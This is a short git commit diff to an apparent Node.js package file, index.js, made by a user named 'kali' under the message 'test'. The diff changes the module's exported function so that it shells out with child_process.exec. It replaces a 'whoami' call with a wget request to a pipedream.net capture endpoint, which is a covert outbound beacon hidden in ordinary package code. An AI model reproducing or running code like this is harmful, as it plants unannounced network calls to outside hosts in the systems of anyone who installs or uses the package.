168df9c0aedbd4cd724f1151fd7c9222270bf78e
kali <kali@localhost.localdomain>
2023-09-01 22:59:38 +0200

    test

--- index.js
+++ index.js
@@ -1,7 +1,7 @@
 const { exec } = require('child_process');
 
 module.exports = function() {
-    exec('whoami', (error, stdout, stderr) => {
+    exec('wget https://eop6hnhxqa4cd27.m.pipedream.net', (error, stdout, stderr) => {
         if (error) {
             console.error(`exec error: ${error}`);
             return;
